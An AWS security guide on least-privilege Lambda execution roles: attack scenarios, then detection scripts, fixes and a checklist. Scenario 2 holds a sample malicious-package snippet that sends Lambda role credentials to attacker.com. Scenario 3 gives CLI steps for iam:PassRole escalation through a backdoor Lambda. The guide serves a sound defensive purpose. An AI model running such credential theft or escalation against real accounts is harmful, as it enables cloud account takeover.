# Lambda Execution Roles — Least Privilege

## Attack Scenarios

### Scenario 1 — Overprivileged Function Used as Pivot
```python
# Lambda function that only needs to read from one DynamoDB table
# but has AdministratorAccess attached to its execution role

import boto3
import os

def handler(event, context):
    # What the function is supposed to do
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table('UserSessions')
    return table.get_item(Key={'session_id': event['session_id']})

# What an attacker can do if they inject code or exploit a vulnerability:
# - List all IAM users and roles
# - Create new admin IAM users
# - Read all S3 buckets
# - Spin up EC2 instances for crypto mining
# - Exfiltrate secrets from Secrets Manager
```

### Scenario 2 — Execution Role Assumed via Vulnerable Dependency
```bash
# Attacker publishes a malicious version of a popular npm/pip package
# Your Lambda's requirements.txt pulls it in on next deploy

# Malicious package's __init__.py runs on import:
import boto3, os, urllib.request

creds = boto3.Session().get_credentials().get_frozen_credentials()
urllib.request.urlopen(
  f"https://attacker.com/steal?key={creds.access_key}&secret={creds.secret_key}&token={creds.token}"
)
# Lambda execution role credentials are now exfiltrated
# Attacker uses them before the function TTL expires
```

### Scenario 3 — iam:PassRole Abuse via Lambda
```bash
# Attacker has a low-privilege role but it has:
# iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction

# Create a Lambda with an admin execution role
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.12 \
  --role arn:aws:iam::123456789:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

# Invoke it — runs as admin
aws lambda invoke --function-name backdoor /tmp/output.json
# Now attacker has full admin access through the Lambda
```

---

## Detection

```bash
# 1. Find Lambda functions with AdministratorAccess execution roles
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Role]' --output text | \
  while IFS=$'\t' read -r fn_name role_arn; do
    role_name=$(echo "$role_arn" | cut -d'/' -f2)
    admin=$(aws iam list-attached-role-policies --role-name "$role_name" \
      --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
      --output text 2>/dev/null || echo "")
    [[ -n "$admin" ]] && echo "CRITICAL: Lambda $fn_name has AdministratorAccess on role $role_name"
  done

# 2. Find Lambda execution roles with wildcard permissions
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Role]' --output text | \
  while IFS=$'\t' read -r fn_name role_arn; do
    role_name=$(echo "$role_arn" | cut -d'/' -f2)
    # Check inline policies for wildcards
    policies=$(aws iam list-role-policies --role-name "$role_name" \
      --query 'PolicyNames' --output text 2>/dev/null || echo "")
    for policy in $policies; do
      doc=$(aws iam get-role-policy --role-name "$role_name" --policy-name "$policy" \
        --query 'PolicyDocument' --output json 2>/dev/null || echo "{}")
      if echo "$doc" | grep -q '"Action": "\*"'; then
        echo "WARNING: Lambda $fn_name role $role_name has wildcard Action in inline policy $policy"
      fi
    done
  done

# 3. Check CloudTrail for Lambda role being used from unexpected sources
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventSource,AttributeValue=lambda.amazonaws.com \
  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[?EventName!=`InvokeFunction`].[EventTime,EventName,Username]' \
  --output table

# 4. List all unique execution roles across Lambda functions
aws lambda list-functions \
  --query 'Functions[*].Role' --output text | tr '\t' '\n' | sort -u
# Review each role's permissions
```

---

## Fix — Scope Execution Roles to Minimum Needed

```bash
# Fix 1: Create a scoped execution role for a specific function
# Function only needs to read from one DynamoDB table and write logs

aws iam create-role \
  --role-name lambda-session-reader-role \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"Service": "lambda.amazonaws.com"},
      "Action": "sts:AssumeRole"
    }]
  }'

# Minimal CloudWatch Logs permission (always needed)
aws iam attach-role-policy \
  --role-name lambda-session-reader-role \
  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole

# Only the specific DynamoDB table this function reads
aws iam put-role-policy \
  --role-name lambda-session-reader-role \
  --policy-name DynamoDBReadOnly \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": ["dynamodb:GetItem", "dynamodb:Query"],
      "Resource": "arn:aws:dynamodb:ap-south-1:123456789:table/UserSessions"
    }]
  }'

# Fix 2: Assign the scoped role to the function
aws lambda update-function-configuration \
  --function-name my-session-function \
  --role arn:aws:iam::123456789:role/lambda-session-reader-role

# Fix 3: Verify the role permissions
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789:role/lambda-session-reader-role \
  --action-names "dynamodb:GetItem" "s3:GetObject" "iam:ListUsers" \
  --resource-arns "arn:aws:dynamodb:ap-south-1:123456789:table/UserSessions" "*" "*" \
  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' \
  --output table
# dynamodb:GetItem = allowed, s3:GetObject = denied, iam:ListUsers = denied
```

---

## Checklist

- [ ] Every Lambda has its own dedicated execution role — no shared roles
- [ ] No Lambda execution role has `AdministratorAccess` or wildcard actions
- [ ] Roles scoped to specific resource ARNs — not `Resource: *`
- [ ] `AWSLambdaBasicExecutionRole` used as the base — add permissions on top
- [ ] `AWSLambdaVPCAccessExecutionRole` used if function is in a VPC
- [ ] IAM Access Analyzer reviewed for overpermissive Lambda roles
- [ ] Permission boundaries applied to all Lambda execution roles
